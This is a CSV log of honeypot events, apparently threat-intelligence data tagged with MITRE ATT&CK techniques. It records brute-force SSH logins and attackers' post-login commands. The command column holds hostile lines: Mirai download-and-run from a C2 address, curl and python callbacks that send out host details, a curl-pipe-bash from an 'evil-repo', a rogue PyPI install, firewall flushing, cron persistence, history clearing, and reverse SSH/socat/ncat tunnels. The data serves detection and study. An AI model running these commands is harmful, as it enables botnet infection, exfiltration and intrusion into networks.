event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-003358,A293895C,2025-02-08T12:02:53Z,login_attempt,hp-br-01,64.225.104.67,40356,10.0.4.10,22,ssh,azureuser,toor,True,,0,US,AS14061,DigitalOcean,Botnet/DDoS,T1110,Brute Force,high,,,,447,288,1798,compromised_login,False,,bf040638-ce10-4166-9391-2227679c7448,
EVT-003359,A293895C,2025-02-08T12:02:59Z,command_executed,hp-br-01,64.225.104.67,55777,10.0.4.10,22,ssh,azureuser,toor,True,uname -a,1,US,AS14061,DigitalOcean,Botnet/DDoS,T1082,System Information Discovery,low,,,,447,372,310,botnet_ddos,False,,f8c3f944-844c-484a-be11-000bbaf70f26,
EVT-003360,A293895C,2025-02-08T12:03:03Z,command_executed,hp-br-01,64.225.104.67,49866,10.0.4.10,22,ssh,azureuser,toor,True,arch,2,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,447,473,139,botnet_ddos,False,,8db62065-4d7b-4783-ad82-2f19ff67668b,
EVT-003364,A293895C,2025-02-08T12:03:35Z,command_executed,hp-br-01,64.225.104.67,48862,10.0.4.10,22,ssh,azureuser,toor,True,wget -q http://194.165.16.11/bins/mirai.arm -O /tmp/mirai && chmod 777 /tmp/mirai,6,US,AS14061,DigitalOcean,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,6f2c1024eb9041c1b8aaeb34ea954a5c,447,389,383,botnet_ddos,False,,11132a3b-48ca-40c8-81ef-fd322af44d02,
EVT-003361,A293895C,2025-02-08T12:04:35Z,command_executed,hp-br-01,64.225.104.67,40408,10.0.4.10,22,ssh,azureuser,toor,True,cat /proc/version,3,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,447,500,316,botnet_ddos,False,,3ca15a34-ead0-4cae-a4e8-487f78363f10,
EVT-003365,A293895C,2025-02-08T12:05:13Z,command_executed,hp-br-01,64.225.104.67,33590,10.0.4.10,22,ssh,azureuser,toor,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,US,AS14061,DigitalOcean,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,a16979521b6949daa06e294eb8e6b4bd,447,447,243,botnet_ddos,False,,09ddbcd4-cc59-48f9-b245-0147a87976be,
EVT-003367,A293895C,2025-02-08T12:05:17Z,command_executed,hp-br-01,64.225.104.67,40114,10.0.4.10,22,ssh,azureuser,toor,True,cd /tmp && /tmp/mirai &,9,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,447,225,282,botnet_ddos,False,,0547d283-fa72-4d2e-a679-d4c44894b775,
EVT-003362,A293895C,2025-02-08T12:05:45Z,command_executed,hp-br-01,64.225.104.67,42030,10.0.4.10,22,ssh,azureuser,toor,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,447,498,449,botnet_ddos,False,,323189dc-3420-4b89-aaea-e4d4580db499,
EVT-003363,A293895C,2025-02-08T12:06:38Z,command_executed,hp-br-01,64.225.104.67,44570,10.0.4.10,22,ssh,azureuser,toor,True,df -h / | tail -1 | awk '{print $4}',5,US,AS14061,DigitalOcean,Botnet/DDoS,T1082,System Information Discovery,low,,,,447,131,120,botnet_ddos,False,,9607707b-d4cf-44c6-80cd-68c1d5877d9f,
EVT-003366,A293895C,2025-02-08T12:07:41Z,command_executed,hp-br-01,64.225.104.67,51811,10.0.4.10,22,ssh,azureuser,toor,True,wget -q http://194.165.16.11/bins/mirai.mips -O /tmp/mirai && chmod 777 /tmp/mirai,8,US,AS14061,DigitalOcean,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,a6a0f1538273466c98ae15e39d723b64,447,300,274,botnet_ddos,False,,e3e5cf44-d921-4d1c-a5dc-6e1bbd43e8a2,
EVT-003374,A293895C,2025-02-08T12:07:41Z,command_executed,hp-br-01,64.225.104.67,58656,10.0.4.10,22,ssh,azureuser,toor,True,history -c,16,US,AS14061,DigitalOcean,Botnet/DDoS,T1070.003,Clear Command History,low,,,,447,202,169,botnet_ddos,False,,19349729-34eb-49fa-be4e-098665a63a49,
EVT-003368,A293895C,2025-02-08T12:08:03Z,command_executed,hp-br-01,64.225.104.67,58154,10.0.4.10,22,ssh,azureuser,toor,True,iptables -A INPUT -j ACCEPT,10,US,AS14061,DigitalOcean,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,447,116,112,botnet_ddos,True,,783d6270-eb21-40e1-a658-74000a504116,
EVT-003370,A293895C,2025-02-08T12:08:53Z,command_executed,hp-br-01,64.225.104.67,52221,10.0.4.10,22,ssh,azureuser,toor,True,iptables -F,12,US,AS14061,DigitalOcean,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,447,439,83,botnet_ddos,False,,75ee603a-9cf3-4e95-9644-16330b8ecf57,
EVT-003373,A293895C,2025-02-08T12:08:53Z,command_executed,hp-br-01,64.225.104.67,51909,10.0.4.10,22,ssh,azureuser,toor,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,447,570,195,botnet_ddos,False,,a5801d03-7077-4bfb-bdbd-2a555cdebde0,
EVT-003371,A293895C,2025-02-08T12:09:10Z,command_executed,hp-br-01,64.225.104.67,48915,10.0.4.10,22,ssh,azureuser,toor,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,US,AS14061,DigitalOcean,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,447,586,69,botnet_ddos,False,,104b4dce-4957-4855-ac14-c1e9fc3c8ac9,
EVT-003369,A293895C,2025-02-08T12:10:02Z,command_executed,hp-br-01,64.225.104.67,58509,10.0.4.10,22,ssh,azureuser,toor,True,iptables -A OUTPUT -j ACCEPT,11,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,447,368,350,botnet_ddos,False,,e084bde9-2899-44c8-8743-d6139eb9f90f,
EVT-003372,A293895C,2025-02-08T12:10:49Z,command_executed,hp-br-01,64.225.104.67,55498,10.0.4.10,22,ssh,azureuser,toor,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,US,AS14061,DigitalOcean,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,206e9f32614349878aa37979c7d2a84c,447,82,455,botnet_ddos,False,,21f97eba-e12e-43c5-b086-b4ffe432044b,
EVT-000995,CDDA17BD,2025-02-08T19:06:10Z,login_attempt,hp-ap-01,209.141.57.189,59607,10.0.3.10,23,telnet,devops,root,False,,0,US,AS53667,Frantech,Rootkit/Persistence,T1110,Brute Force,medium,,,,497,364,2860,brute_force,False,,,
EVT-001266,1FE19FBF,2025-02-08T22:24:34Z,login_attempt,hp-eu-02,178.128.83.165,44745,10.0.1.11,22,ssh,zabbix,admin123,True,,0,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1110,Brute Force,high,,,,222,451,1193,compromised_login,False,,34f1b479-bc61-4ba1-82c0-e97650235dba,
EVT-001267,1FE19FBF,2025-02-08T22:24:49Z,command_executed,hp-eu-02,178.128.83.165,33698,10.0.1.11,22,ssh,zabbix,admin123,True,uname -a && id,1,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1082,System Information Discovery,low,,,,222,424,465,supply_chain_abuse,False,,dc28be55-4b8a-40ae-bb40-370703d63f55,
EVT-001269,1FE19FBF,2025-02-08T22:24:49Z,command_executed,hp-eu-02,178.128.83.165,50905,10.0.1.11,22,ssh,zabbix,admin123,True,pip3 list 2>/dev/null | grep -iE 'django|flask|requests|paramiko',3,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,222,510,316,supply_chain_abuse,False,,a877ef02-8698-47cc-a080-fb0519ca13e7,
EVT-001268,1FE19FBF,2025-02-08T22:24:50Z,command_executed,hp-eu-02,178.128.83.165,49603,10.0.1.11,22,ssh,zabbix,admin123,True,which pip pip3 npm yarn gem composer 2>/dev/null,2,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,222,234,246,supply_chain_abuse,False,,8f79bdce-88b5-4d64-9597-19757a17b1d0,
EVT-001274,1FE19FBF,2025-02-08T22:25:22Z,command_executed,hp-eu-02,178.128.83.165,52615,10.0.1.11,22,ssh,zabbix,admin123,True,curl -fsSL https://raw.githubusercontent.com/evil-repo/malicious-pkg/main/install.sh | bash,8,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1105,Ingress Tool Transfer,medium,yes,,343565abbf70447c9a58ab767576d2c2,222,187,106,supply_chain_abuse,True,,35af458f-710d-4f97-9c0c-7f0cabb9b18c,
EVT-001272,1FE19FBF,2025-02-08T22:25:52Z,command_executed,hp-eu-02,178.128.83.165,35453,10.0.1.11,22,ssh,zabbix,admin123,True,find / -name 'requirements*.txt' 2>/dev/null | head,6,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,222,272,477,supply_chain_abuse,False,,488da15c-5e64-4065-9a1f-30323327f829,
EVT-001270,1FE19FBF,2025-02-08T22:26:02Z,command_executed,hp-eu-02,178.128.83.165,38762,10.0.1.11,22,ssh,zabbix,admin123,True,npm list -g 2>/dev/null | head -20,4,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,222,401,167,supply_chain_abuse,False,,558437de-6885-4dd9-9083-a93062d99f0d,
EVT-001277,1FE19FBF,2025-02-08T22:26:02Z,command_executed,hp-eu-02,178.128.83.165,42348,10.0.1.11,22,ssh,zabbix,admin123,True,find / -name 'site-packages' 2>/dev/null | xargs ls 2>/dev/null | grep requests,11,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,222,529,141,supply_chain_abuse,False,,807100e0-8a99-433a-b1d4-1ce6a9647cb8,
EVT-001273,1FE19FBF,2025-02-08T22:27:36Z,command_executed,hp-eu-02,178.128.83.165,42577,10.0.1.11,22,ssh,zabbix,admin123,True,find / -name 'package.json' -not -path '*/node_modules/*' 2>/dev/null | head,7,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,222,503,352,supply_chain_abuse,True,,b6a4d425-fed5-4a46-a557-6146021ef89a,
EVT-001276,1FE19FBF,2025-02-08T22:27:44Z,command_executed,hp-eu-02,178.128.83.165,43245,10.0.1.11,22,ssh,zabbix,admin123,True,"python3 -c ""import requests; requests.get('http://194.165.16.11/callback?h=$(hostname)&u=$(id -un)')""",10,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1082,System Information Discovery,medium,,194.165.16.11,,222,143,397,supply_chain_abuse,False,,3621b788-2ca3-4051-8893-66608867403f,
EVT-001271,1FE19FBF,2025-02-08T22:28:19Z,command_executed,hp-eu-02,178.128.83.165,49000,10.0.1.11,22,ssh,zabbix,admin123,True,cat /usr/local/lib/python3*/dist-packages/requests/__init__.py | head -5,5,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,222,562,347,supply_chain_abuse,False,,dba64748-43cf-4a50-8bf0-741b088692d7,
EVT-001275,1FE19FBF,2025-02-08T22:29:04Z,command_executed,hp-eu-02,178.128.83.165,45699,10.0.1.11,22,ssh,zabbix,admin123,True,pip3 install --index-url http://194.165.16.11/pypi/ requests-patched 2>/dev/null,9,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1195.001,Compromise Software Supply Chain,critical,,194.165.16.11,,222,563,80,supply_chain_abuse,True,,a4bdfc9e-0b87-413a-b9d1-3d6454434171,
EVT-001278,1FE19FBF,2025-02-08T22:30:34Z,command_executed,hp-eu-02,178.128.83.165,32896,10.0.1.11,22,ssh,zabbix,admin123,True,history -c,12,SG,AS14061,DigitalOcean SG,Supply Chain Abuse,T1070.003,Clear Command History,low,,,,222,341,186,supply_chain_abuse,False,,8e26d5c6-7016-4deb-a344-181629fbf053,
EVT-002216,E8DCB523,2025-02-09T00:09:31Z,login_attempt,hp-br-01,222.187.232.205,57511,10.0.4.10,2222,ssh,devops,Autumn2023#,False,,0,CN,AS4134,ChinaNet,Network Reconnaissance,T1110,Brute Force,medium,,,,409,278,2743,brute_force,False,,,
EVT-001132,C94398C9,2025-02-09T02:47:27Z,login_attempt,hp-us-01,45.142.212.100,34259,10.0.2.10,22,ssh,grafana,VMware1!,True,,0,RU,AS197695,Reg.ru,Supply Chain Abuse,T1110,Brute Force,high,,,,283,501,1998,compromised_login,False,,2a6c623a-693c-4a1d-aed2-366957d0d3c8,
EVT-001134,C94398C9,2025-02-09T02:47:43Z,command_executed,hp-us-01,45.142.212.100,46949,10.0.2.10,22,ssh,grafana,VMware1!,True,which pip pip3 npm yarn gem composer 2>/dev/null,2,RU,AS197695,Reg.ru,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,283,457,460,supply_chain_abuse,False,,5fffe260-a1a5-4d90-8721-2170926cb41b,
EVT-001133,C94398C9,2025-02-09T02:47:45Z,command_executed,hp-us-01,45.142.212.100,43476,10.0.2.10,22,ssh,grafana,VMware1!,True,uname -a && id,1,RU,AS197695,Reg.ru,Supply Chain Abuse,T1082,System Information Discovery,low,,,,283,316,194,supply_chain_abuse,True,,0aaffdc9-b81b-4777-8a40-774d73418468,
EVT-001137,C94398C9,2025-02-09T02:48:12Z,command_executed,hp-us-01,45.142.212.100,40281,10.0.2.10,22,ssh,grafana,VMware1!,True,cat /usr/local/lib/python3*/dist-packages/requests/__init__.py | head -5,5,RU,AS197695,Reg.ru,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,283,588,287,supply_chain_abuse,False,,c5d080fe-7f3e-483a-9795-1a2fcf898531,
EVT-001136,C94398C9,2025-02-09T02:48:39Z,command_executed,hp-us-01,45.142.212.100,50832,10.0.2.10,22,ssh,grafana,VMware1!,True,npm list -g 2>/dev/null | head -20,4,RU,AS197695,Reg.ru,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,283,437,55,supply_chain_abuse,False,,d182427d-0733-46d0-992c-dcf959a6757c,
EVT-001138,C94398C9,2025-02-09T02:49:09Z,command_executed,hp-us-01,45.142.212.100,37025,10.0.2.10,22,ssh,grafana,VMware1!,True,find / -name 'requirements*.txt' 2>/dev/null | head,6,RU,AS197695,Reg.ru,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,283,205,281,supply_chain_abuse,False,,e847708c-1a27-404d-863d-69d9dd53856a,
EVT-001135,C94398C9,2025-02-09T02:49:12Z,command_executed,hp-us-01,45.142.212.100,52863,10.0.2.10,22,ssh,grafana,VMware1!,True,pip3 list 2>/dev/null | grep -iE 'django|flask|requests|paramiko',3,RU,AS197695,Reg.ru,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,283,153,440,supply_chain_abuse,False,,71a2e558-7465-42da-ba35-3fb39ebde90b,
EVT-001144,C94398C9,2025-02-09T02:49:15Z,command_executed,hp-us-01,45.142.212.100,56209,10.0.2.10,22,ssh,grafana,VMware1!,True,history -c,12,RU,AS197695,Reg.ru,Supply Chain Abuse,T1070.003,Clear Command History,low,,,,283,198,474,supply_chain_abuse,False,,159e42f9-c435-4300-8c5c-856f9dbc486d,
EVT-001139,C94398C9,2025-02-09T02:50:36Z,command_executed,hp-us-01,45.142.212.100,50913,10.0.2.10,22,ssh,grafana,VMware1!,True,find / -name 'package.json' -not -path '*/node_modules/*' 2>/dev/null | head,7,RU,AS197695,Reg.ru,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,283,168,99,supply_chain_abuse,False,,c2553663-3ca1-4aa0-b32f-9184c51418e7,
EVT-001140,C94398C9,2025-02-09T02:51:19Z,command_executed,hp-us-01,45.142.212.100,36218,10.0.2.10,22,ssh,grafana,VMware1!,True,curl -fsSL https://raw.githubusercontent.com/evil-repo/malicious-pkg/main/install.sh | bash,8,RU,AS197695,Reg.ru,Supply Chain Abuse,T1105,Ingress Tool Transfer,medium,yes,,1505eee2839f45f5be818af8020f180b,283,277,129,supply_chain_abuse,False,,d3a301fe-10f2-49f4-878e-06bf69f0ea52,
EVT-001142,C94398C9,2025-02-09T02:51:27Z,command_executed,hp-us-01,45.142.212.100,52061,10.0.2.10,22,ssh,grafana,VMware1!,True,"python3 -c ""import requests; requests.get('http://194.165.16.11/callback?h=$(hostname)&u=$(id -un)')""",10,RU,AS197695,Reg.ru,Supply Chain Abuse,T1082,System Information Discovery,medium,,194.165.16.11,,283,559,98,supply_chain_abuse,True,,795a73e6-0829-48d4-9239-200a00896ffb,
EVT-001141,C94398C9,2025-02-09T02:52:15Z,command_executed,hp-us-01,45.142.212.100,40852,10.0.2.10,22,ssh,grafana,VMware1!,True,pip3 install --index-url http://194.165.16.11/pypi/ requests-patched 2>/dev/null,9,RU,AS197695,Reg.ru,Supply Chain Abuse,T1195.001,Compromise Software Supply Chain,critical,,194.165.16.11,,283,254,432,supply_chain_abuse,False,,2b6f984a-f858-431c-995c-a4d78d87f68b,
EVT-001143,C94398C9,2025-02-09T02:54:36Z,command_executed,hp-us-01,45.142.212.100,36886,10.0.2.10,22,ssh,grafana,VMware1!,True,find / -name 'site-packages' 2>/dev/null | xargs ls 2>/dev/null | grep requests,11,RU,AS197695,Reg.ru,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,283,139,321,supply_chain_abuse,False,,dad9e405-728c-494f-b326-f33c4f45f927,
EVT-000802,02803CC3,2025-02-09T04:38:58Z,login_attempt,hp-ap-01,198.199.119.50,51208,10.0.3.10,22,ssh,nagios,1234,False,,0,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1110,Brute Force,medium,,,,499,397,2256,brute_force,False,,,
EVT-002923,5CEBB641,2025-02-10T10:02:53Z,login_attempt,hp-ap-01,162.243.143.105,36830,10.0.3.10,22,ssh,zabbix,Passw0rd!,False,,0,US,AS14061,DigitalOcean,Data Exfiltration,T1110,Brute Force,medium,,,,139,584,1431,brute_force,False,,,
EVT-002657,7B78E7B1,2025-02-11T01:17:54Z,login_attempt,hp-us-01,162.243.143.105,58027,10.0.2.10,22,ssh,jenkins,12345678,True,,0,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1110,Brute Force,high,,,,265,579,1283,compromised_login,False,,867e30a6-e40d-454e-a455-4deee2290607,
EVT-002658,7B78E7B1,2025-02-11T01:18:30Z,command_executed,hp-us-01,162.243.143.105,34286,10.0.2.10,22,ssh,jenkins,12345678,True,uname -a && id,1,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1082,System Information Discovery,low,,,,265,163,440,pivoting_tunneling,False,,db144d89-a7e4-44c2-9f4f-1eb1e57e418b,
EVT-002665,7B78E7B1,2025-02-11T01:18:34Z,command_executed,hp-us-01,162.243.143.105,42921,10.0.2.10,22,ssh,jenkins,12345678,True,ssh -o StrictHostKeyChecking=no -fND 1080 jump@185.220.101.47,8,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,265,587,486,pivoting_tunneling,False,,0ed2fdb3-3b3f-4001-867f-3596f03d20c5,
EVT-002660,7B78E7B1,2025-02-11T01:18:42Z,command_executed,hp-us-01,162.243.143.105,38727,10.0.2.10,22,ssh,jenkins,12345678,True,cat /etc/ssh/sshd_config | grep -E 'Port|AllowTcp|GatewayPort',3,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,265,498,265,pivoting_tunneling,False,,237fdbbe-cd25-4789-be13-1c63d7e43e4f,
EVT-002659,7B78E7B1,2025-02-11T01:18:50Z,command_executed,hp-us-01,162.243.143.105,57929,10.0.2.10,22,ssh,jenkins,12345678,True,ss -tlnp,2,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,265,112,409,pivoting_tunneling,False,,f7db74f0-508d-41ae-b627-6cd7eb64a547,
EVT-002669,7B78E7B1,2025-02-11T01:19:30Z,command_executed,hp-us-01,162.243.143.105,44898,10.0.2.10,22,ssh,jenkins,12345678,True,history -c,12,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1070.003,Clear Command History,low,,,,265,91,191,pivoting_tunneling,False,,35e4e3db-3ba9-43ff-a484-482d8f767f7b,
EVT-002661,7B78E7B1,2025-02-11T01:19:42Z,command_executed,hp-us-01,162.243.143.105,39816,10.0.2.10,22,ssh,jenkins,12345678,True,which socat ncat nc netcat 2>/dev/null,4,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1572,Protocol Tunneling,high,,,,265,559,442,pivoting_tunneling,False,,ee7eefc5-2402-4d1c-b80b-17977b8aa104,
EVT-002668,7B78E7B1,2025-02-11T01:21:12Z,command_executed,hp-us-01,162.243.143.105,34404,10.0.2.10,22,ssh,jenkins,12345678,True,echo 'ProxyJump 185.220.101.47' >> ~/.ssh/config,11,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,265,469,329,pivoting_tunneling,False,,a5e56399-24e5-42ea-bc61-75d3a4e1fd49,
EVT-002662,7B78E7B1,2025-02-11T01:21:34Z,command_executed,hp-us-01,162.243.143.105,55901,10.0.2.10,22,ssh,jenkins,12345678,True,"socat TCP-LISTEN:8080,fork TCP:10.0.0.5:3389 &",5,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1572,Protocol Tunneling,high,,,,265,595,486,pivoting_tunneling,False,,6b3f775f-db5c-4cfa-8ba4-8e928cf40e15,
EVT-002666,7B78E7B1,2025-02-11T01:21:39Z,command_executed,hp-us-01,162.243.143.105,55027,10.0.2.10,22,ssh,jenkins,12345678,True,curl --socks5 127.0.0.1:1080 http://10.0.0.20:8500/v1/kv 2>/dev/null,9,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,medium,,,,265,510,173,pivoting_tunneling,False,,ca535d36-0c7a-4804-8ba8-96f577991b51,
EVT-002663,7B78E7B1,2025-02-11T01:22:00Z,command_executed,hp-us-01,162.243.143.105,38403,10.0.2.10,22,ssh,jenkins,12345678,True,ncat -lvp 1080 --sh-exec 'ncat 10.0.0.10 22' &,6,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,265,194,251,pivoting_tunneling,True,,923dd6ef-f8ca-40f6-b05f-80c76c754be3,
EVT-002664,7B78E7B1,2025-02-11T01:22:41Z,command_executed,hp-us-01,162.243.143.105,42687,10.0.2.10,22,ssh,jenkins,12345678,True,ssh -o StrictHostKeyChecking=no -fNR 2222:localhost:22 pivot@185.220.101.47,7,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,265,323,89,pivoting_tunneling,False,,c2eaf32a-1433-4148-aa25-2e21b86b1df3,
EVT-002667,7B78E7B1,2025-02-11T01:25:14Z,command_executed,hp-us-01,162.243.143.105,38398,10.0.2.10,22,ssh,jenkins,12345678,True,"proxychains nmap -sT -p 22,80,443,3389 10.0.0.0/24 2>/dev/null",10,US,AS14061,DigitalOcean,Pivoting/Tunneling,T1046,Network Service Discovery,medium,,,,265,459,251,pivoting_tunneling,False,,577dbc27-512a-4e7e-92ec-61017d51e97c,
EVT-001373,A7728736,2025-02-11T09:56:14Z,login_attempt,hp-eu-02,195.54.160.149,46439,10.0.1.11,22,ssh,admin,BeagleBone,True,,0,UA,AS44812,Serverius UA,Network Reconnaissance,T1110,Brute Force,high,,,,491,714,1503,compromised_login,False,,34177e5f-5efb-413f-aa6f-4ad464eb7f99,
EVT-001374,A7728736,2025-02-11T09:56:24Z,command_executed,hp-eu-02,195.54.160.149,59994,10.0.1.11,22,ssh,admin,BeagleBone,True,uname -a && id,1,UA,AS44812,Serverius UA,Network Reconnaissance,T1082,System Information Discovery,low,,,,491,212,202,network_reconnaissance,False,,75855471-efa8-4a5d-836d-f7b9d11e4d39,
EVT-001378,A7728736,2025-02-11T09:56:29Z,command_executed,hp-eu-02,195.54.160.149,37101,10.0.1.11,22,ssh,admin,BeagleBone,True,arp -a 2>/dev/null,5,UA,AS44812,Serverius UA,Network Reconnaissance,T1059,Command and Scripting Interpreter,low,,,,491,82,468,network_reconnaissance,False,,364f244a-5f6f-4dd9-9dc8-cb705575c706,
EVT-001376,A7728736,2025-02-11T09:56:41Z,command_executed,hp-eu-02,195.54.160.149,52604,10.0.1.11,22,ssh,admin,BeagleBone,True,cat /etc/hosts && cat /etc/resolv.conf,3,UA,AS44812,Serverius UA,Network Reconnaissance,T1059,Command and Scripting Interpreter,low,,,,491,517,56,network_reconnaissance,False,,2f1c5df8-9ef6-4619-ab94-2ba1e94b2ca2,
EVT-001375,A7728736,2025-02-11T09:56:52Z,command_executed,hp-eu-02,195.54.160.149,55208,10.0.1.11,22,ssh,admin,BeagleBone,True,ip a && ip route && ip neigh,2,UA,AS44812,Serverius UA,Network Reconnaissance,T1059,Command and Scripting Interpreter,low,,,,491,110,159,network_reconnaissance,False,,2af6ba2a-af54-4b00-9985-0291032aa2f1,
EVT-001381,A7728736,2025-02-11T09:56:54Z,command_executed,hp-eu-02,195.54.160.149,37713,10.0.1.11,22,ssh,admin,BeagleBone,True,nmap -sn 10.0.0.0/24 -oG - 2>/dev/null | grep Up | awk '{print $2}',8,UA,AS44812,Serverius UA,Network Reconnaissance,T1046,Network Service Discovery,medium,,,,491,568,368,network_reconnaissance,False,,8b20f259-e50f-44b3-a93f-2d4fc70ea5b3,
EVT-001380,A7728736,2025-02-11T09:57:03Z,command_executed,hp-eu-02,195.54.160.149,48106,10.0.1.11,22,ssh,admin,BeagleBone,True,cat /proc/net/arp,7,UA,AS44812,Serverius UA,Network Reconnaissance,T1059,Command and Scripting Interpreter,low,,,,491,151,401,network_reconnaissance,False,,9b755c68-b6e1-4b8a-8489-ee437c711dc2,
